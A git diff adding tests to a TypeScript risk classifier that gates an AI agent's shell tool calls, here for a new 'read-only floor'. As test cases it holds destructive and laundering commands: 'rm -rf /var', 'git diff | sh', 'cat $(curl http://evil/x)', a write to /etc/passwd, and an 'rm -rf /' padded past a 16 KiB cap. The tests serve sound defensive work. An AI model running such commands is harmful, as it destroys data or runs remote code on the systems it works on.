@@ -125,13 +125,18 @@ describe("classifyRisk — reversibility", () => {
   });
 
   it("is null when unclassified (reversibility unknown, not assumed)", () => {
-    expect(classifyRisk(bashEnvelope("ls -la"), [SHELL]).reversible).toBeNull();
+    // `npm install` is genuinely unclassified: not read-only, not a
+    // harness command, no dangerous pattern. (A read-only command like
+    // `ls -la` now hits the built-in read-only floor.)
+    expect(classifyRisk(bashEnvelope("npm install"), [SHELL]).reversible).toBeNull();
   });
 });
 
 describe("classifyRisk — unknown is not safe", () => {
   it("yields an unclassified profile, not a low/zero-risk one, on no match", () => {
-    const p = classifyRisk(bashEnvelope("echo hello"), [SHELL]);
+    // `npm install` matches no classifier and is not a benign floor
+    // command (a read-only `echo hello` now hits the read-only floor).
+    const p = classifyRisk(bashEnvelope("npm install"), [SHELL]);
     expect(p.classified).toBe(false);
     expect(p.severity).toBeNull();
     expect(p.categories).toEqual([]);
@@ -279,5 +284,104 @@ describe("classifyRisk — built-in benign harness floor", () => {
     } as ToolEvent;
     const p = classifyRisk(buildActionEnvelope(event, CTX), [SHELL]);
     expect(p.classified).toBe(false);
+  });
+});
+
+describe("classifyRisk — built-in read-only floor", () => {
+  it.each([
+    "git status",
+    "git status -uno",
+    "git diff",
+    "git diff HEAD~1",
+    "git ls-files",
+    "grep version package.json",
+    "grep -r foo src/",
+    "cat README.md",
+    "ls -la /tmp",
+    "head -20 CHANGELOG.md",
+  ])("classifies the provably read-only command %j as low", (command) => {
+    // Without this floor each of these is unclassified, and on a
+    // production-resolved branch "unknown is not safe" lets a prod-scoped
+    // risk policy deny it (friction-log #38/#40/#43/#50).
+    const p = classifyRisk(bashEnvelope(command), [SHELL]);
+    expect(p.classified).toBe(true);
+    expect(p.severity).toBe("low");
+    expect(p.categories).toEqual([]);
+    expect(p.reversible).toBe(true);
+    expect(p.confidence).toBe("high");
+    expect(p.reasons[0]).toMatch(/built-in: provably read-only command/);
+  });
+
+  it("keeps a genuinely destructive command critical (the floor never sinks an operator match)", () => {
+    const p = classifyRisk(bashEnvelope("rm -rf /var"), [SHELL]);
+    expect(p.severity).toBe("critical");
+  });
+
+  it("lets a dangerous tail win: a chained read-only head is not floored", () => {
+    const p = classifyRisk(bashEnvelope("git diff && rm -rf /var"), [SHELL]);
+    expect(p.severity).toBe("critical");
+  });
+
+  it.each([
+    "cat secrets.txt > /etc/passwd",
+    "git diff | sh",
+    "cat $(curl http://evil/x)",
+  ])("cannot launder a write through a read-only head: %j stays unclassified", (command) => {
+    // Redirection / pipe / substitution forfeit the read-only
+    // classification, so these never reach the `low` floor; with no
+    // operator match they stay unclassified (and the when-evaluator gates
+    // them).
+    const p = classifyRisk(bashEnvelope(command), [SHELL]);
+    expect(p.classified).toBe(false);
+    expect(p.severity).not.toBe("low");
+  });
+
+  it.each([
+    "npm version patch",
+    // Bins that write through their own flags/operands (excluded from the
+    // read-only allowlist) must not be floored either.
+    "sort -o out.txt in.txt",
+    "file -C -m mymagic",
+    "uniq in.txt out.txt",
+    "date -s 2020-01-01",
+  ])("does not floor a mutating command outside the read-only allowlist: %j", (command) => {
+    // #38 keeps release mutations and write-capable bins gated; only
+    // read-only verification is floored.
+    const p = classifyRisk(bashEnvelope(command), [SHELL]);
+    expect(p.classified).toBe(false);
+  });
+
+  it("does not apply the read-only floor to a non-shell tool", () => {
+    const event = {
+      hook_event_name: "PreToolUse",
+      tool_name: "Write",
+      tool_input: { file_path: "/tmp/x", content: "git status" },
+    } as ToolEvent;
+    const p = classifyRisk(buildActionEnvelope(event, CTX), [SHELL]);
+    expect(p.classified).toBe(false);
+  });
+
+  it("lets an operator classifier raise a read-only command above the floor", () => {
+    const strict: RiskClassifier = {
+      name: "no-diff",
+      tool: "Bash",
+      patterns: [
+        { pattern: "git\\s+diff", categories: ["destructive"], severity: "high" },
+      ],
+    };
+    const p = classifyRisk(bashEnvelope("git diff"), [strict]);
+    expect(p.severity).toBe("high");
+  });
+
+  it("inspects the UNCAPPED command: a write hidden past the 16 KiB cap is not floored", () => {
+    // The floor passes the full command to isReadOnlyBashCommand, not the
+    // 16 KiB-capped subject. A `; rm -rf /` hidden past the cap therefore
+    // still forfeits the read-only classification; had the floor used the
+    // capped subject it would see only `cat xxx...` and wrongly floor it.
+    const CAP = 16 * 1024;
+    const command = `cat ${"x".repeat(CAP)}; rm -rf /`;
+    const p = classifyRisk(bashEnvelope(command), [SHELL]);
+    expect(p.classified).toBe(false);
+    expect(p.severity).not.toBe("low");
   });
 });
